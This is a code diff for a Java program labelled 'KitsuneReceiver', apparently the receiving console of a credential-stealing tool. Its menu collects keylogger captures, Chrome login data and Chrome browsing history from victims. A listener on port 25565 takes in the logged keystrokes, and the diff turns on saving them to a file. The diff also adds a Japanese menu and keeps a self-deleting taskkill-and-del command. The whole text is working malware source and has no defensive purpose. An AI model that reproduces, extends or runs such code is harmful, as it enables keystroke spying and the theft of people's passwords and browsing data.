@@ -16,7 +16,7 @@ public class ashiatonikki
 				 Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
 				 System.exit(0);
 		  }
-		  System.out.println("KitsuneReceiver v0.4.2 by Carb0n");
+		  System.out.println("KitsuneReceiver v0.4.1 by Carb0n");
 		  System.out.println("Enter the passcode");
 		  Scanner sc = new Scanner(System.in);
 		  String pwd = sc.nextLine();
@@ -35,24 +35,42 @@ public class ashiatonikki
 		  int dab = cal.get(Calendar.DATE);
 		  int hours = cal.get(Calendar.HOUR_OF_DAY);
 		  int minutes = cal.get(Calendar.MINUTE);
+		  int language = 1;
+		  if (language == 1) {
 		  System.out.println("The current date is " + dab + "-" + hours + ":" + minutes);
 		  System.out.println("Please input your command.");
 		  System.out.println("[1] Receive Keylogger Files");
-		  System.out.println("[2] Receive Chrome Login Data");
+		  System.out.println("[2] Receive Chrome Login Data (Encrypted)");
 		  System.out.println("[5] Receive Chrome History Data");
 		  System.out.println("[3] Quit");
+		  } else if (language == 3) {
+			  System.out.println("現在の日付は " + dab + "-" + hours + ":" + minutes);
+			  System.out.println("あなたのコマンドを入力してください。");
+			  System.out.println("[1] キーボード履歴を受け取る");
+			  System.out.println("[2] ログインデータを受け取る");
+			  System.out.println("[5] インターネット履歴を受信する");
+			  System.out.println("[3] 出口");
+		  }
 		  Scanner c = new Scanner(System.in);
 		  String ch = c.nextLine();
 		  if (ch.matches("1")) {
-			  break;
+			  getKeyLogs();
 		  } else if (ch.matches("2")) {
 			  getLogin();
 		  } else if (ch.matches("3")) {
 			  System.exit(0);
 		  } else if (ch.matches("5")) {
 			  getHistory();
+		  } else if (ch.matches("6")) {
+			  if (language == 1) {
+				  language = 3;
+			  } else if (language == 3) {
+				  language = 1;
+			  }
 		  }
 	  }
+  }
+  public static void getKeyLogs() throws IOException {
 	  for(;;) {
 	  @SuppressWarnings("resource")
 	  ServerSocket sersock = new ServerSocket(25565);
@@ -71,7 +89,7 @@ public class ashiatonikki
     	  if((receiveMessage = receiveRead.readLine()) != null)  
           {
         	 System.out.println(receiveMessage); 
-        	 // record(receiveMessage);
+        	 record(receiveMessage);
           } else {
         	  sock.close();
         	  break;
